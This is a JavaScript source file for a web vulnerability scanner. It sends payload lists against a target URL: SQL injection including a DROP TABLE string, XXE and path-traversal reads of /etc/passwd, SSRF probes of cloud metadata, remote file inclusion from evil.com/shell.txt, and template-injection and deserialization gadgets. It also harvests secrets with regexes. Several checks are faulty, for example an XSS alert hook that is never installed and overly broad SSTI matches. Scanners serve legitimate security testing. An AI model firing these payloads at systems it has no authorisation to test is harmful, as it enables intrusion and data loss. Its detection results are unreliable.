const axios = require('axios');
const cheerio = require('cheerio');
const puppeteer = require('puppeteer');
const dns = require('dns').promises;
const crypto = require('crypto');
const { URL } = require('url');

class EnhancedSecurityScanner {
  constructor() {
    this.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    this.timeout = 30000;
  }

  // Main scan function
  async scanTarget(targetUrl, options = {}) {
    const scanId = this.generateScanId();
    const results = {
      endpoints: [],
      subdomains: [],
      s3Buckets: [],
      secrets: [],
      cors: [],
      xss: [],
      openRedirects: [],
      ssrf: [],
      xxe: [],
      sqli: [],
      csrf: [],
      idor: [],
      lfi: [],
      rfi: [],
      ssti: [],
      deserialization: [],
      jwt: [],
      graphql: [],
      api: [],
      vulnerabilities: []
    };

    try {
      const url = new URL(targetUrl);
      
      // Parallel scanning
      const scanPromises = [
        this.scanEndpoints(targetUrl),
        this.scanSubdomains(url.hostname),
        this.scanS3Buckets(url.hostname),
        this.scanSecrets(targetUrl),
        this.scanCORS(targetUrl),
        this.scanXSS(targetUrl),
        this.scanOpenRedirects(targetUrl),
        this.scanSSRF(targetUrl),
        this.scanXXE(targetUrl),
        this.scanSQLi(targetUrl),
        this.scanCSRF(targetUrl),
        this.scanIDOR(targetUrl),
        this.scanLFI(targetUrl),
        this.scanRFI(targetUrl),
        this.scanSSTI(targetUrl),
        this.scanDeserialization(targetUrl),
        this.scanJWT(targetUrl),
        this.scanGraphQL(targetUrl),
        this.scanAPI(targetUrl)
      ];

      const scanResults = await Promise.allSettled(scanPromises);
      
      // Process results
      scanResults.forEach((result, index) => {
        if (result.status === 'fulfilled') {
          const keys = Object.keys(results);
          if (keys[index]) {
            results[keys[index]] = result.value;
          }
        }
      });

      // Analyze for vulnerabilities
      results.vulnerabilities = await this.analyzeVulnerabilities(results);

      return { scanId, results };
    } catch (error) {
      console.error('Scan error:', error);
      throw error;
    }
  }

  // Endpoint discovery
  async scanEndpoints(targetUrl) {
    const endpoints = new Set();
    
    try {
      const response = await axios.get(targetUrl, {
        timeout: this.timeout,
        headers: { 'User-Agent': this.userAgent }
      });
      
      const $ = cheerio.load(response.data);
      
      // Extract from HTML
      $('a[href]').each((i, el) => {
        const href = $(el).attr('href');
        if (href && (href.startsWith('/') || href.startsWith('http'))) {
          endpoints.add(href);
        }
      });

      $('form[action]').each((i, el) => {
        const action = $(el).attr('action');
        if (action) endpoints.add(action);
      });

      // Extract from JavaScript
      const scriptContent = $('script').text();
      const jsEndpoints = this.extractEndpointsFromJS(scriptContent);
      jsEndpoints.forEach(endpoint => endpoints.add(endpoint));

      return Array.from(endpoints).map(url => ({
        url: this.normalizeUrl(url, targetUrl),
        method: 'GET',
        statusCode: 200,
        responseTime: 0,
        headers: {},
        vulnerabilities: []
      }));
    } catch (error) {
      console.error('Endpoint scan error:', error);
      return [];
    }
  }

  // Subdomain enumeration
  async scanSubdomains(domain) {
    const subdomains = new Set();
    const commonSubdomains = [
      'www', 'mail', 'ftp', 'admin', 'api', 'app', 'blog', 'shop', 'store',
      'dev', 'test', 'staging', 'prod', 'production', 'demo', 'beta', 'alpha',
      'cdn', 'static', 'assets', 'img', 'images', 'js', 'css', 'files',
      'docs', 'help', 'support', 'status', 'monitor', 'dashboard', 'panel',
      'login', 'auth', 'oauth', 'sso', 'account', 'user', 'users', 'profile',
      'secure', 'ssl', 'vpn', 'remote', 'backup', 'db', 'database', 'mysql',
      'postgres', 'redis', 'cache', 'queue', 'worker', 'job', 'cron',
      'webhook', 'callback', 'notify', 'alert', 'log', 'logs', 'analytics',
      'stats', 'metrics', 'report', 'reports', 'export', 'import', 'sync'
    ];

    for (const subdomain of commonSubdomains) {
      try {
        const fullDomain = `${subdomain}.${domain}`;
        const addresses = await dns.resolve4(fullDomain);
        if (addresses.length > 0) {
          subdomains.add({
            subdomain: fullDomain,
            ip: addresses[0],
            status: 'active',
            technologies: []
          });
        }
      } catch (error) {
        // Subdomain doesn't exist
      }
    }

    return Array.from(subdomains);
  }

  // S3 bucket discovery
  async scanS3Buckets(domain) {
    const buckets = [];
    const bucketNames = [
      domain,
      `www-${domain}`,
      `${domain}-www`,
      `s3-${domain}`,
      `${domain}-s3`,
      `assets-${domain}`,
      `${domain}-assets`,
      `static-${domain}`,
      `${domain}-static`,
      `files-${domain}`,
      `${domain}-files`
    ];

    for (const bucketName of bucketNames) {
      try {
        const response = await axios.head(`https://${bucketName}.s3.amazonaws.com/`, {
          timeout: 5000
        });
        
        buckets.push({
          bucket: bucketName,
          region: 'us-east-1',
          permissions: 'public-read',
          public: true
        });
      } catch (error) {
        // Bucket doesn't exist or is private
      }
    }

    return buckets;
  }

  // Secrets detection
  async scanSecrets(targetUrl) {
    const secrets = [];
    
    try {
      const response = await axios.get(targetUrl, {
        timeout: this.timeout,
        headers: { 'User-Agent': this.userAgent }
      });
      
      const content = response.data;
      
      // API Keys
      const apiKeyPatterns = [
        /api[_-]?key["'`]?\s*[:=]\s*["'`]([a-zA-Z0-9_\-]{20,})["'`]/gi,
        /["'`]([a-zA-Z0-9_\-]{32,})["'`]/g
      ];
      
      apiKeyPatterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(content)) !== null) {
          secrets.push({
            type: 'API Key',
            value: match[1],
            location: 'Response body',
            severity: 'High'
          });
        }
      });

      // JWT Tokens
      const jwtPattern = /eyJ[a-zA-Z0-9_\-=]+\.eyJ[a-zA-Z0-9_\-=]+\.[a-zA-Z0-9_\-=]+/g;
      let jwtMatch;
      while ((jwtMatch = jwtPattern.exec(content)) !== null) {
        secrets.push({
          type: 'JWT Token',
          value: jwtMatch[0],
          location: 'Response body',
          severity: 'High'
        });
      }

      // Database URLs
      const dbPatterns = [
        /mongodb:\/\/[^"'`\s]+/g,
        /mysql:\/\/[^"'`\s]+/g,
        /postgresql:\/\/[^"'`\s]+/g,
        /redis:\/\/[^"'`\s]+/g
      ];
      
      dbPatterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(content)) !== null) {
          secrets.push({
            type: 'Database URL',
            value: match[0],
            location: 'Response body',
            severity: 'Critical'
          });
        }
      });

      // AWS Keys
      const awsPattern = /AKIA[0-9A-Z]{16}/g;
      let awsMatch;
      while ((awsMatch = awsPattern.exec(content)) !== null) {
        secrets.push({
          type: 'AWS Access Key',
          value: awsMatch[0],
          location: 'Response body',
          severity: 'Critical'
        });
      }

    } catch (error) {
      console.error('Secrets scan error:', error);
    }

    return secrets;
  }

  // CORS misconfiguration detection
  async scanCORS(targetUrl) {
    const corsResults = [];
    
    try {
      const response = await axios.get(targetUrl, {
        timeout: this.timeout,
        headers: { 
          'User-Agent': this.userAgent,
          'Origin': 'https://evil.com'
        }
      });
      
      const corsHeaders = {
        'Access-Control-Allow-Origin': response.headers['access-control-allow-origin'],
        'Access-Control-Allow-Credentials': response.headers['access-control-allow-credentials'],
        'Access-Control-Allow-Methods': response.headers['access-control-allow-methods'],
        'Access-Control-Allow-Headers': response.headers['access-control-allow-headers']
      };

      const isVulnerable = corsHeaders['Access-Control-Allow-Origin'] === '*' && 
                          corsHeaders['Access-Control-Allow-Credentials'] === 'true';

      corsResults.push({
        origin: corsHeaders['Access-Control-Allow-Origin'] || 'Not set',
        credentials: corsHeaders['Access-Control-Allow-Credentials'] === 'true',
        methods: corsHeaders['Access-Control-Allow-Methods']?.split(',') || [],
        headers: corsHeaders['Access-Control-Allow-Headers']?.split(',') || [],
        vulnerable: isVulnerable
      });

    } catch (error) {
      console.error('CORS scan error:', error);
    }

    return corsResults;
  }

  // XSS vulnerability detection
  async scanXSS(targetUrl) {
    const xssResults = [];
    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ];

    try {
      const browser = await puppeteer.launch({ headless: true });
      const page = await browser.newPage();
      
      for (const payload of payloads) {
        try {
          await page.goto(`${targetUrl}?test=${encodeURIComponent(payload)}`, {
            waitUntil: 'networkidle2',
            timeout: 10000
          });
          
          const alerts = await page.evaluate(() => {
            return window.alertCalls || [];
          });
          
          if (alerts.length > 0) {
            xssResults.push({
              type: 'Reflected XSS',
              payload: payload,
              location: 'URL parameter',
              severity: 'High'
            });
          }
        } catch (error) {
          // Continue with next payload
        }
      }
      
      await browser.close();
    } catch (error) {
      console.error('XSS scan error:', error);
    }

    return xssResults;
  }

  // Open redirect detection
  async scanOpenRedirects(targetUrl) {
    const redirectResults = [];
    const redirectPayloads = [
      'https://evil.com',
      '//evil.com',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'ftp://evil.com',
      'file:///etc/passwd'
    ];

    for (const payload of redirectPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?redirect=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          maxRedirects: 0,
          validateStatus: (status) => status < 400
        });
        
        if (response.headers.location && response.headers.location.includes('evil.com')) {
          redirectResults.push({
            url: `${targetUrl}?redirect=${payload}`,
            payload: payload,
            vulnerable: true
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return redirectResults;
  }

  // SSRF (Server-Side Request Forgery) detection
  async scanSSRF(targetUrl) {
    const ssrfResults = [];
    const ssrfPayloads = [
      'http://169.254.169.254/latest/meta-data/',
      'http://localhost:22',
      'http://127.0.0.1:22',
      'http://0.0.0.0:22',
      'file:///etc/passwd',
      'gopher://127.0.0.1:22',
      'dict://127.0.0.1:22',
      'ftp://127.0.0.1:22'
    ];

    for (const payload of ssrfPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?url=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('169.254.169.254') || 
            response.data.includes('localhost') ||
            response.data.includes('127.0.0.1') ||
            response.data.includes('root:') ||
            response.data.includes('meta-data')) {
          ssrfResults.push({
            url: `${targetUrl}?url=${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Internal network access detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return ssrfResults;
  }

  // XXE (XML External Entity) detection
  async scanXXE(targetUrl) {
    const xxeResults = [];
    const xxePayloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>'
    ];

    for (const payload of xxePayloads) {
      try {
        const response = await axios.post(targetUrl, payload, {
          timeout: 10000,
          headers: {
            'Content-Type': 'application/xml',
            'User-Agent': this.userAgent
          }
        });
        
        if (response.data.includes('root:') ||
            response.data.includes('localhost') ||
            response.data.includes('169.254.169.254')) {
          xxeResults.push({
            url: targetUrl,
            payload: payload,
            vulnerable: true,
            evidence: 'XXE vulnerability detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return xxeResults;
  }

  // SQL Injection detection
  async scanSQLi(targetUrl) {
    const sqliResults = [];
    const sqliPayloads = [
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT NULL--",
      "' AND 1=1--",
      "' AND 1=2--",
      "'; DROP TABLE users--",
      "' OR 'x'='x",
      "1' OR '1'='1",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "' OR 1=1/*"
    ];

    for (const payload of sqliPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?id=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('SQL syntax') ||
            response.data.includes('mysql_fetch') ||
            response.data.includes('ORA-01756') ||
            response.data.includes('Microsoft OLE DB') ||
            response.data.includes('PostgreSQL') ||
            response.data.includes('SQLite') ||
            response.data.includes('Warning: mysql_') ||
            response.data.includes('valid MySQL result') ||
            response.data.includes('MySqlClient.') ||
            response.data.includes('SQLServer JDBC Driver') ||
            response.data.includes('com.mysql.jdbc.exceptions') ||
            response.data.includes('org.postgresql.util.PSQLException') ||
            response.data.includes('SQLSTATE') ||
            response.data.includes('Unclosed quotation mark')) {
          sqliResults.push({
            url: `${targetUrl}?id=${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'SQL error detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return sqliResults;
  }

  // CSRF (Cross-Site Request Forgery) detection
  async scanCSRF(targetUrl) {
    const csrfResults = [];
    
    try {
      const response = await axios.get(targetUrl, {
        timeout: this.timeout,
        headers: { 'User-Agent': this.userAgent }
      });
      
      const content = response.data;
      const $ = cheerio.load(content);
      
      // Check for forms without CSRF tokens
      $('form').each((i, form) => {
        const $form = $(form);
        const action = $form.attr('action');
        const method = $form.attr('method') || 'GET';
        
        if (method.toUpperCase() === 'POST' && action) {
          const hasCSRFToken = $form.find('input[name*="csrf"], input[name*="token"], input[name*="_token"]').length > 0;
          const hasSameSiteCookie = response.headers['set-cookie']?.some(cookie => 
            cookie.includes('SameSite=Strict') || cookie.includes('SameSite=Lax')
          );
          
          if (!hasCSRFToken && !hasSameSiteCookie) {
            csrfResults.push({
              url: targetUrl,
              formAction: action,
              method: method,
              vulnerable: true,
              evidence: 'Form lacks CSRF protection'
            });
          }
        }
      });
    } catch (error) {
      console.error('CSRF scan error:', error);
    }

    return csrfResults;
  }

  // IDOR (Insecure Direct Object Reference) detection
  async scanIDOR(targetUrl) {
    const idorResults = [];
    const idorPayloads = [
      '1', '2', '3', '4', '5',
      'admin', 'administrator', 'root',
      'user', 'test', 'demo',
      '0', '-1', '999999'
    ];

    for (const payload of idorPayloads) {
      try {
        const response = await axios.get(`${targetUrl}/${payload}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.status === 200 && response.data.length > 0) {
          idorResults.push({
            url: `${targetUrl}/${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Direct object access possible'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return idorResults;
  }

  // LFI (Local File Inclusion) detection
  async scanLFI(targetUrl) {
    const lfiResults = [];
    const lfiPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '/etc/passwd',
      'C:\\windows\\system32\\drivers\\etc\\hosts',
      'file:///etc/passwd',
      'php://filter/read=convert.base64-encode/resource=index.php'
    ];

    for (const payload of lfiPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?file=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('root:') ||
            response.data.includes('bin:') ||
            response.data.includes('daemon:') ||
            response.data.includes('127.0.0.1') ||
            response.data.includes('localhost') ||
            response.data.includes('<?php') ||
            response.data.includes('<?=')) {
          lfiResults.push({
            url: `${targetUrl}?file=${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Local file inclusion detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return lfiResults;
  }

  // RFI (Remote File Inclusion) detection
  async scanRFI(targetUrl) {
    const rfiResults = [];
    const rfiPayloads = [
      'http://evil.com/shell.txt',
      'https://evil.com/shell.txt',
      'ftp://evil.com/shell.txt',
      '//evil.com/shell.txt',
      '\\\\evil.com\\shell.txt'
    ];

    for (const payload of rfiPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?file=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('evil.com') ||
            response.data.includes('Remote file inclusion') ||
            response.data.includes('Warning: include()') ||
            response.data.includes('Warning: require()')) {
          rfiResults.push({
            url: `${targetUrl}?file=${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Remote file inclusion detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return rfiResults;
  }

  // SSTI (Server-Side Template Injection) detection
  async scanSSTI(targetUrl) {
    const sstiResults = [];
    const sstiPayloads = [
      '{{7*7}}',
      '${7*7}',
      '#{7*7}',
      '<%=7*7%>',
      '{{config}}',
      '{{self}}',
      '{{""__class__.__mro__[2].__subclasses__()}}',
      '{{""__class__.__mro__[1].__subclasses__()}}',
      '{{""__class__.__mro__[0].__subclasses__()}}'
    ];

    for (const payload of sstiPayloads) {
      try {
        const response = await axios.get(`${targetUrl}?name=${encodeURIComponent(payload)}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.data.includes('49') ||
            response.data.includes('__class__') ||
            response.data.includes('__mro__') ||
            response.data.includes('__subclasses__') ||
            response.data.includes('config') ||
            response.data.includes('self')) {
          sstiResults.push({
            url: `${targetUrl}?name=${payload}`,
            payload: payload,
            vulnerable: true,
            evidence: 'Template injection detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return sstiResults;
  }

  // Deserialization vulnerability detection
  async scanDeserialization(targetUrl) {
    const deserializationResults = [];
    const deserializationPayloads = [
      'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
      'a:1:{s:4:"test";s:4:"test";}',
      '{"__type":"System.Windows.Data.ObjectDataProvider"}',
      '{"$type":"System.Data.DataSet"}',
      '{"$type":"System.Configuration.Install.AssemblyInstaller"}'
    ];

    for (const payload of deserializationPayloads) {
      try {
        const response = await axios.post(targetUrl, payload, {
          timeout: 10000,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': this.userAgent
          }
        });
        
        if (response.data.includes('unserialize') ||
            response.data.includes('deserialize') ||
            response.data.includes('ObjectDataProvider') ||
            response.data.includes('DataSet') ||
            response.data.includes('AssemblyInstaller')) {
          deserializationResults.push({
            url: targetUrl,
            payload: payload,
            vulnerable: true,
            evidence: 'Deserialization vulnerability detected'
          });
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return deserializationResults;
  }

  // JWT vulnerability detection
  async scanJWT(targetUrl) {
    const jwtResults = [];
    
    try {
      const response = await axios.get(targetUrl, {
        timeout: this.timeout,
        headers: { 'User-Agent': this.userAgent }
      });
      
      const content = response.data;
      const jwtPattern = /eyJ[a-zA-Z0-9_\-=]+\.eyJ[a-zA-Z0-9_\-=]+\.[a-zA-Z0-9_\-=]+/g;
      let jwtMatch;
      
      while ((jwtMatch = jwtPattern.exec(content)) !== null) {
        const token = jwtMatch[0];
        const parts = token.split('.');
        
        if (parts.length === 3) {
          try {
            const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            
            // Check for weak algorithms
            if (header.alg === 'none' || header.alg === 'HS256' || !header.alg) {
              jwtResults.push({
                token: token,
                algorithm: header.alg || 'none',
                vulnerable: true,
                evidence: 'Weak or no algorithm specified'
              });
            }
            
            // Check for missing expiration
            if (!payload.exp) {
              jwtResults.push({
                token: token,
                algorithm: header.alg,
                vulnerable: true,
                evidence: 'Token has no expiration'
              });
            }
          } catch (error) {
            // Invalid JWT format
          }
        }
      }
    } catch (error) {
      console.error('JWT scan error:', error);
    }

    return jwtResults;
  }

  // GraphQL vulnerability detection
  async scanGraphQL(targetUrl) {
    const graphqlResults = [];
    const graphqlEndpoints = ['/graphql', '/api/graphql', '/query', '/api/query'];
    
    for (const endpoint of graphqlEndpoints) {
      try {
        const response = await axios.post(`${targetUrl}${endpoint}`, {
          query: '{ __schema { types { name } } }'
        }, {
          timeout: 10000,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': this.userAgent
          }
        });
        
        if (response.data && response.data.data) {
          graphqlResults.push({
            endpoint: `${targetUrl}${endpoint}`,
            vulnerable: true,
            evidence: 'GraphQL introspection enabled'
          });
        }
      } catch (error) {
        // Continue with next endpoint
      }
    }

    return graphqlResults;
  }

  // API vulnerability detection
  async scanAPI(targetUrl) {
    const apiResults = [];
    const apiEndpoints = ['/api', '/api/v1', '/api/v2', '/rest', '/rest/api'];
    
    for (const endpoint of apiEndpoints) {
      try {
        const response = await axios.get(`${targetUrl}${endpoint}`, {
          timeout: 10000,
          headers: { 'User-Agent': this.userAgent }
        });
        
        if (response.status === 200) {
          // Check for API documentation exposure
          if (response.data.includes('swagger') ||
              response.data.includes('openapi') ||
              response.data.includes('api-docs') ||
              response.data.includes('swagger-ui')) {
            apiResults.push({
              endpoint: `${targetUrl}${endpoint}`,
              vulnerable: true,
              evidence: 'API documentation exposed'
            });
          }
          
          // Check for version information
          if (response.data.includes('version') ||
              response.data.includes('Version') ||
              response.data.includes('API-Version')) {
            apiResults.push({
              endpoint: `${targetUrl}${endpoint}`,
              vulnerable: true,
              evidence: 'API version information exposed'
            });
          }
        }
      } catch (error) {
        // Continue with next endpoint
      }
    }

    return apiResults;
  }

  // Vulnerability analysis
  async analyzeVulnerabilities(results) {
    const vulnerabilities = [];
    
    // CORS vulnerabilities
    results.cors.forEach(cors => {
      if (cors.vulnerable) {
        vulnerabilities.push({
          name: 'CORS Misconfiguration',
          severity: 'High',
          description: 'CORS allows credentials with wildcard origin',
          poc: 'Send request with Origin: https://evil.com and credentials: true',
          remediation: 'Set specific origins instead of wildcard when using credentials'
        });
      }
    });
    
    // Exposed secrets
    results.secrets.forEach(secret => {
      vulnerabilities.push({
        name: `Exposed ${secret.type}`,
        severity: secret.severity,
        description: `${secret.type} found in response`,
        poc: `Check ${secret.location} for ${secret.type}`,
        remediation: 'Remove or rotate the exposed secret immediately'
      });
    });
    
    // XSS vulnerabilities
    results.xss.forEach(xss => {
      vulnerabilities.push({
        name: 'Cross-Site Scripting (XSS)',
        severity: xss.severity,
        description: `XSS vulnerability found with payload: ${xss.payload}`,
        poc: `Test with payload: ${xss.payload}`,
        remediation: 'Implement proper input validation and output encoding'
      });
    });
    
    // Open redirects
    results.openRedirects.forEach(redirect => {
      if (redirect.vulnerable) {
        vulnerabilities.push({
          name: 'Open Redirect',
          severity: 'Medium',
          description: 'Application allows redirect to external domains',
          poc: `Test with: ${redirect.url}`,
          remediation: 'Implement allowlist of valid redirect URLs'
        });
      }
    });

    // SSRF vulnerabilities
    results.ssrf.forEach(ssrf => {
      if (ssrf.vulnerable) {
        vulnerabilities.push({
          name: 'Server-Side Request Forgery (SSRF)',
          severity: 'High',
          description: 'Application makes requests to internal resources',
          poc: `Test with: ${ssrf.url}`,
          remediation: 'Implement proper URL validation and network segmentation'
        });
      }
    });

    // XXE vulnerabilities
    results.xxe.forEach(xxe => {
      if (xxe.vulnerable) {
        vulnerabilities.push({
          name: 'XML External Entity (XXE)',
          severity: 'High',
          description: 'XML parser processes external entities',
          poc: `Test with: ${xxe.payload}`,
          remediation: 'Disable external entity processing in XML parser'
        });
      }
    });

    // SQL Injection vulnerabilities
    results.sqli.forEach(sqli => {
      if (sqli.vulnerable) {
        vulnerabilities.push({
          name: 'SQL Injection',
          severity: 'Critical',
          description: 'Application vulnerable to SQL injection attacks',
          poc: `Test with: ${sqli.url}`,
          remediation: 'Use parameterized queries and input validation'
        });
      }
    });

    // CSRF vulnerabilities
    results.csrf.forEach(csrf => {
      if (csrf.vulnerable) {
        vulnerabilities.push({
          name: 'Cross-Site Request Forgery (CSRF)',
          severity: 'Medium',
          description: 'Forms lack CSRF protection',
          poc: `Check form at: ${csrf.url}`,
          remediation: 'Implement CSRF tokens and SameSite cookies'
        });
      }
    });

    // IDOR vulnerabilities
    results.idor.forEach(idor => {
      if (idor.vulnerable) {
        vulnerabilities.push({
          name: 'Insecure Direct Object Reference (IDOR)',
          severity: 'Medium',
          description: 'Direct access to objects without authorization',
          poc: `Test with: ${idor.url}`,
          remediation: 'Implement proper authorization checks'
        });
      }
    });

    // LFI vulnerabilities
    results.lfi.forEach(lfi => {
      if (lfi.vulnerable) {
        vulnerabilities.push({
          name: 'Local File Inclusion (LFI)',
          severity: 'High',
          description: 'Application includes local files',
          poc: `Test with: ${lfi.url}`,
          remediation: 'Implement proper file path validation'
        });
      }
    });

    // RFI vulnerabilities
    results.rfi.forEach(rfi => {
      if (rfi.vulnerable) {
        vulnerabilities.push({
          name: 'Remote File Inclusion (RFI)',
          severity: 'Critical',
          description: 'Application includes remote files',
          poc: `Test with: ${rfi.url}`,
          remediation: 'Disable remote file inclusion'
        });
      }
    });

    // SSTI vulnerabilities
    results.ssti.forEach(ssti => {
      if (ssti.vulnerable) {
        vulnerabilities.push({
          name: 'Server-Side Template Injection (SSTI)',
          severity: 'High',
          description: 'Template engine processes user input',
          poc: `Test with: ${ssti.url}`,
          remediation: 'Use safe template rendering'
        });
      }
    });

    // Deserialization vulnerabilities
    results.deserialization.forEach(deserialization => {
      if (deserialization.vulnerable) {
        vulnerabilities.push({
          name: 'Insecure Deserialization',
          severity: 'High',
          description: 'Application deserializes untrusted data',
          poc: `Test with: ${deserialization.payload}`,
          remediation: 'Avoid deserializing untrusted data'
        });
      }
    });

    // JWT vulnerabilities
    results.jwt.forEach(jwt => {
      if (jwt.vulnerable) {
        vulnerabilities.push({
          name: 'JWT Vulnerability',
          severity: 'Medium',
          description: jwt.evidence,
          poc: `Check JWT: ${jwt.token}`,
          remediation: 'Use strong algorithms and proper validation'
        });
      }
    });

    // GraphQL vulnerabilities
    results.graphql.forEach(graphql => {
      if (graphql.vulnerable) {
        vulnerabilities.push({
          name: 'GraphQL Introspection',
          severity: 'Low',
          description: 'GraphQL introspection is enabled',
          poc: `Check endpoint: ${graphql.endpoint}`,
          remediation: 'Disable introspection in production'
        });
      }
    });

    // API vulnerabilities
    results.api.forEach(api => {
      if (api.vulnerable) {
        vulnerabilities.push({
          name: 'API Information Disclosure',
          severity: 'Low',
          description: api.evidence,
          poc: `Check endpoint: ${api.endpoint}`,
          remediation: 'Restrict API documentation access'
        });
      }
    });

    return vulnerabilities;
  }

  // Helper methods
  generateScanId() {
    return crypto.randomBytes(16).toString('hex');
  }

  normalizeUrl(url, baseUrl) {
    try {
      return new URL(url, baseUrl).href;
    } catch (error) {
      return url;
    }
  }

  extractEndpointsFromJS(content) {
    const endpoints = [];
    const patterns = [
      /fetch\(["'`]([^"'`]+)["'`]\)/g,
      /axios\.(get|post|put|delete|patch)\(["'`]([^"'`]+)["'`]\)/g,
      /\.ajax\([^)]*url\s*:\s*["'`]([^"'`]+)["'`]/g,
      /XMLHttpRequest.*open\(["'`]([^"'`]+)["'`]/g
    ];
    
    patterns.forEach(pattern => {
      let match;
      while ((match = pattern.exec(content)) !== null) {
        endpoints.push(match[1] || match[2]);
      }
    });
    
    return endpoints;
  }
}

module.exports = EnhancedSecurityScanner;
